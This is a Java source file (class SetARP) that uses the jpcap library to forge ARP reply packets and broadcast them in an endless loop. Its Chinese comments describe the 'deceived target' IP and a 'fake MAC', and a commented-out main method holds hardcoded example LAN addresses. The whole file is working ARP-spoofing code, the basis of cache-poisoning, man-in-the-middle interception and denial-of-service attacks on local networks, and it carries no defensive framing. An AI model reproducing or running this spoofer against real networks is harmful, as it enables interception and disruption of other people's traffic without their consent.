package Util.SetPacket;

import java.net.InetAddress;
import java.net.UnknownHostException;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

public class SetARP {
	
	
	 
	 /*************************************************
	 * 主函数
	 *************************************************/
	  /* public static void main(String[] args) throws Exception {  
	        int time = 2;  // 重发间隔时间  
	       
	        // 打开网卡设备  
	        SetARP ss = new SetARP();
	        NetworkInterface[] devices = JpcapCaptor.getDeviceList();  
	        NetworkInterface device = devices[0];  
	        JpcapSender sender = JpcapSender.openDevice(device); 
	        ARPPacket arp = ss.fakeARP("192.168.1.100","192.168.1.1","AC:CF:23:87:BD:2E","60:D8:19:4A:B2:FC");
	        
	        // 发送ARP应答包  
	        while (true) {  
System.out.println("sending arp..");  
	           sender.sendPacket(arp);  
	            Thread.sleep(time * 1000);  
	        }  
	    } 
	    */
	    
	    
	    /*************************************************
		 * 外调函数
		 *************************************************/
	    public  void run_ARP(JpcapSender js,String targetIP,String souIP,String targetMAC,String fakeMAC) throws Exception {  
	        int time = 2;  // 重发间隔时间  
	       
	        // 打开网卡设备  
	        //NetworkInterface[] devices = JpcapCaptor.getDeviceList(); r 
	        //NetworkInterface device = devices[0];  
	        //JpcapSender sender = JpcapSender.openDevice(device); 
	        //ARPPacket arp = fakeARP("192.168.8.102","192.168.8.1","AC-CF-23-87-BD-2E","60-D8-19-4A-B2-FC");
	        ARPPacket arp = fakeARP(targetIP,souIP,targetMAC,fakeMAC);
	        
	        
	        // 发送ARP应答包  
	        while (true) {  
System.out.println("sending arp..");
	
				synchronized (js) {
					js.sendPacket(arp); 	
				}
	             
	            Thread.sleep(time * 5000);  
	        }  
	    }  
	    
	    
	    
	    
	    
	    
	    
	    
	    /*************************************************
		 * 该函数用于解析MAC地址
		 *************************************************/
	    public static byte[] stomac(String s) {  
	        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };  
	        String[] s1 = s.split(":");  
	        for (int x = 0; x < s1.length; x++) {  
	            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);  
	        }  
	        return mac;  
	    }  
	    
	    
	    /*************************************************
		 * 该函数用于数据包伪造
		 *************************************************/
	    public  ARPPacket fakeARP(String targetIP,String souIP,String targetMAC,String fakeMAC){
	    	
	    	InetAddress desip = null;
	    	InetAddress srcip = null;
			try {
				desip = InetAddress.getByName(targetIP);// 被欺骗的目标IP地址 
				srcip = InetAddress.getByName(souIP);// 源IP地址 
			} catch (UnknownHostException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} 
	        byte[] desmac = stomac(targetMAC);// 被欺骗的目标目标MAC数组  
	         
	        byte[] srcmac = stomac(fakeMAC); // 假的MAC数组  
	        // 设置ARP包  
	        ARPPacket arp = new ARPPacket();  
	        arp.hardtype = ARPPacket.HARDTYPE_ETHER;  
	        arp.prototype = ARPPacket.PROTOTYPE_IP;  
	        arp.operation = ARPPacket.ARP_REPLY;  
	        arp.hlen = 6;  
	        arp.plen = 4;  
	        arp.sender_hardaddr = srcmac;  
	        arp.sender_protoaddr = srcip.getAddress();  
	        arp.target_hardaddr = desmac;  
	        arp.target_protoaddr = desip.getAddress();  
	        // 设置DLC帧  
	        EthernetPacket ether = new EthernetPacket();  
	        ether.frametype = EthernetPacket.ETHERTYPE_ARP;  
	        ether.src_mac = srcmac;  
	        ether.dst_mac = desmac;  
	        arp.datalink = ether;  
	    	
	    	return arp;
	    }

}
